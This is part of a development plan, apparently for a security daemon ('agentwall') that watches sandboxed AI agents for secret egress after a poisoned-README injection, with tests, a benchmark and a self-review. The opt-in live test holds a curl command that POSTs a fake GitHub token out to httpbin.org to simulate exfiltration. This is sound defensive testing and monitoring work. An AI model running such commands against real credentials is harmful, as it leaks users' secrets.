        return {
            "degraded": self._gitleaks.degraded or self._presidio.degraded,
            "egress_degraded": self._egress.degraded if self._egress is not None else False,
            "events": self._cascade.stats.total,
            "tier2_rate": self._cascade.stats.tier2_rate,
            "capabilities": sorted(self._adapter.capabilities()),
        }
```

- [ ] **Step 6: Run tests**

Run: `uv run pytest tests/test_daemon.py tests/policy/test_engine.py -v && uv run pytest -q`
Expected: new daemon + policy tests PASS; full suite green (egress disabled by default, so corpus/bench/existing daemon tests are unaffected). `test_secret_bearing_egress_completes_chain_and_quarantines` now reaches QUARANTINE because the policy engine returns the most severe applicable verdict.

- [ ] **Step 7: Commit**

```bash
git add src/agentwall/policy/engine.py src/agentwall/daemon.py src/agentwall/detect/cascade.py tests/policy/test_engine.py tests/test_daemon.py
git commit -m "feat: daemon wires EgressSensor + payloads, secret-egress chain, async offload; policy returns most-severe applicable verdict"
```

---

## Task 6: Opt-in live-sandbox integration test (row-1 live proof)

**Files:**
- Create: `tests/integration/__init__.py`
- Create: `tests/integration/test_egress_live.py`
- Modify: `pyproject.toml` (register the `integration` marker)

**Interfaces:**
- Consumes: `Daemon`/`DaemonConfig` with `enable_egress=True`, the `make sandbox-*` tooling, `sbx`.
- Produces: an env-gated test (`AGENTWALL_LIVE_SANDBOX=1`) that proves the full live chain; skipped by default so CI/unit runs never need a sandbox.

- [ ] **Step 1: Register the marker**

In `pyproject.toml`, under the pytest config (create `[tool.pytest.ini_options]` `markers` if absent), add:

```toml
[tool.pytest.ini_options]
markers = ["integration: opt-in tests needing a live Docker Sandbox (set AGENTWALL_LIVE_SANDBOX=1)"]
```

- [ ] **Step 2: Write the gated integration test**

Create `tests/integration/__init__.py` (empty) and `tests/integration/test_egress_live.py`:

```python
import asyncio
import os
import subprocess
import time
from pathlib import Path

import pytest

from agentwall.adapters.docker_sandbox import DockerSandboxAdapter
from agentwall.daemon import Daemon, DaemonConfig
from agentwall.detect.model import Verdict
from agentwall.detect.tier0_rules import RulesConfig

pytestmark = pytest.mark.integration

_LIVE = os.environ.get("AGENTWALL_LIVE_SANDBOX") == "1"
_RULES = RulesConfig(sensitive_path_globs=["**/.env"], denied_dest_domains=[],
                     max_upload_bytes=5_000_000, entropy_threshold=7.5)
_SECRET = "ghp_012345678901234567890123456789ABCD"


@pytest.mark.skipif(not _LIVE, reason="set AGENTWALL_LIVE_SANDBOX=1 and provision inspection first")
@pytest.mark.asyncio
async def test_row1_live_egress_quarantines(tmp_path):
    """
    MANUAL SETUP (the daemon owns the proxy — do NOT run `make sandbox-inspect`,
    which starts a conflicting mitmweb on :8888):
      1. Ensure the sandbox exists and egress is chained to :8888 with the CA trusted.
         Reuse the dev workflow's CA-inject + proxy-chain steps ONLY, e.g.:
           sbx settings set proxy.sandbox http://localhost:8888
           # inject ~/.mitmproxy CA into the sandbox trust store (see scripts/sandbox.sh inject_ca)
           sbx daemon restart && ATTACH=0 scripts/sandbox.sh up
      2. Run: AGENTWALL_LIVE_SANDBOX=1 uv run pytest tests/integration -v
    The daemon below starts its OWN mitmdump+addon on :8888.
    """
    cfg = DaemonConfig(workspace=tmp_path, session_id="claude-agentwall",
                       db_path=tmp_path / "ev.db", policy_path=Path("src/agentwall/policy/default_policy.yaml"),
                       rules=_RULES, enable_egress=True, proxy_port=8888)
    d = Daemon(cfg, adapter=DockerSandboxAdapter(workspace=tmp_path))
    # taint the session with an untrusted-source event (stands in for the poisoned-README write).
    # ts must be near real wall-clock time: the live egress event carries mitmproxy's real
    # epoch timestamp, and ChainCorrelator only links events within its 120s window — a
    # placeholder like ts=1.0 would fall outside the window and the chain would never form.
    from agentwall.events import new_event
    await d.submit(new_event(event_type="file_write", session_id="claude-agentwall",
                             source="workspace", ts=time.time(), trust="tainted",
                             attrs={"untrusted_source": "evil.example/README.md"}))
    await d.start()
    try:
        await asyncio.sleep(1.0)  # let mitmdump + socket come up
        subprocess.run(["sbx", "exec", "claude-agentwall", "--", "sh", "-c",
                        f"curl -sS -X POST https://httpbin.org/post -d secret={_SECRET}"],
                       check=True, capture_output=True, timeout=30)
        await asyncio.sleep(1.0)  # let the capture flow through
    finally:
        await d.stop()

    verdicts = [dec.verdict for _, dec, _ in d.decisions]
    chains = [c for _, _, c in d.decisions if c is not None]
    assert Verdict.QUARANTINE in verdicts, f"verdicts={verdicts}"
    assert any(c.steps[-1].startswith("secret-egress:") for c in chains), chains
```

- [ ] **Step 3: Verify it is skipped by default**

Run: `uv run pytest tests/integration -v`
Expected: 1 skipped (reason mentions `AGENTWALL_LIVE_SANDBOX`). Also `uv run pytest -q` full suite stays green and does not spawn a proxy.

- [ ] **Step 4: (Optional, manual) run it live**

If a Docker Sandbox is available, follow the docstring setup and run
`AGENTWALL_LIVE_SANDBOX=1 uv run pytest tests/integration -v`. Record the outcome in the commit message. Do NOT block the task on hardware — the gated-skip in Step 3 is the required, CI-safe verification.

- [ ] **Step 5: Commit**

```bash
git add tests/integration pyproject.toml
git commit -m "test: opt-in live-sandbox egress integration (row-1 live proof), skipped by default"
```

---

## Task 7: Benchmark the egress path

**Files:**
- Modify: `bench/run_bench.py`
- Test: `tests/test_bench.py`

**Interfaces:**
- Consumes: `Daemon`/`DaemonConfig` (egress disabled — measure the event-path only), `EventStore.put_blob`.
- Produces: `run_egress_bench(n: int, tmp_path: Path) -> BenchResult` — submits `n` egress events whose payloads contain a benign body (no secret → resolves at Tier 0/1, no escalation), measuring per-event submit latency p50/p95/p99. Reuses the existing `BenchResult`/`_pct` helpers.

- [ ] **Step 1: Write the failing test**

Add to `tests/test_bench.py`:

```python
@pytest.mark.asyncio
async def test_egress_bench_runs_and_reports_latency(tmp_path):
    from bench.run_bench import run_egress_bench
    r = await run_egress_bench(50, tmp_path)
    assert r.events == 50
    assert r.p95_ms >= 0.0
```

(If `tests/test_bench.py` lacks the async/pytest imports, mirror the existing test in that file.)

- [ ] **Step 2: Run to verify it fails**

Run: `uv run pytest tests/test_bench.py -k egress_bench -v`
Expected: FAIL (`run_egress_bench` undefined).

- [ ] **Step 3: Implement**

Add to `bench/run_bench.py` (reusing the module's existing `BenchResult`, `_pct`, `_POLICY`, `_RULES`, imports, and `time`):

```python
async def run_egress_bench(n: int, tmp_path: Path) -> BenchResult:
    cfg = DaemonConfig(workspace=tmp_path, session_id="bench", db_path=tmp_path / "ev.db",
                       policy_path=_POLICY, rules=_RULES)  # enable_egress stays False
    d = Daemon(cfg, adapter=DockerSandboxAdapter(workspace=tmp_path))
    ref = d._store.put_blob(b"benign body, no secrets here")
    lat: list[float] = []
    for i in range(n):
        e = new_event(event_type="network_upload", session_id="bench", source="egress",
                      ts=float(i), payload_ref=ref, attrs={"destination": "example.com"})
        t0 = time.perf_counter()
        await d.submit(e)
        lat.append((time.perf_counter() - t0) * 1000.0)
    await d.stop()
    lat_sorted = sorted(lat)
    return BenchResult(events=n, p50_ms=_pct(lat_sorted, 50), p95_ms=_pct(lat_sorted, 95),
                       p99_ms=_pct(lat_sorted, 99), tier2_rate=0.0)
```

- [ ] **Step 4: Run tests**

Run: `uv run pytest tests/test_bench.py -v`
Expected: PASS. Note: this path runs Tier-1 for real (Gitleaks over the benign body), so p95 reflects the scanned-egress cost — report it separately from the v0 no-op bench, per the spec.

- [ ] **Step 5: Commit**

```bash
git add bench/run_bench.py tests/test_bench.py
git commit -m "feat: benchmark the scanned egress event path (p50/p95/p99)"
```

---

## Self-Review

**Spec coverage:**
- Catch-secret-on-egress reframe → Tasks 1 (provenance), 3 (addon), 4 (sensor), 5 (has_secret wiring). ✓
- Managed mitmdump + addon over unix socket → Tasks 3, 4. ✓
- Daemon owns proxy listener; port-in-use is an error → Task 4 `_start_proxy`. ✓
- Payload wiring for WorkspaceSensor writes (capped) → Task 2. ✓
- Provenance reframe `untrusted-source → secret-egress`, old 3-node path retained → Task 1. ✓
- Async offload (Tier-1 + quarantine) → Task 5 (cascade + daemon). ✓
- Fail-safe (drop on socket error; malformed → dead-letter; oversize → truncated) → Tasks 3, 4. ✓
- Anthropic host skip → Task 3 `skip_host`. ✓
- Reuse dev CA/chaining, not `make sandbox-inspect` wholesale → Task 6 docstring. ✓
- Opt-in live integration test, skipped by default → Task 6. ✓
- Benchmark egress path → Task 7. ✓
- Scope non-goals (no inline block, no provisioning automation, no response bodies, no plugin machinery) → respected; none implemented. ✓

**Placeholder scan:** every code step has complete code; no TBD/TODO. `EgressSensor` shutdown uses a `_stop_event` created in `__init__`, so the documented run/stop path is deterministic (no "fix if it hangs" caveat). ✓

**Type consistency:** `observe(event, has_secret=False)` (Task 1) is called with `has_secret=` in Task 5. `blob_put: Callable[[bytes], str]` consistent across Tasks 2, 4, 5. `build_record(...)` keys (`host, method, path, scheme, ts, size, truncated, body_b64`) produced in Task 3, consumed in Task 4 `_to_event`. `EgressSensor(socket_path, blob_put, session_id, dead_letter, *, proxy_port, spawn_proxy)` consistent between Tasks 4 and 5. `Detection.classification` `secret:`/`pii:` prefix used in Task 5 matches Gitleaks/Presidio emitters. `DaemonConfig.enable_egress` default `False` keeps corpus/bench/existing daemon tests from spawning a proxy. ✓

**Intentional deferrals (documented, not gaps):** CA/proxy provisioning automation in the adapter, response-body inspection, inline blocking, plugin registry — all explicit non-goals routed to later sub-projects (A/D) or fast-follows.
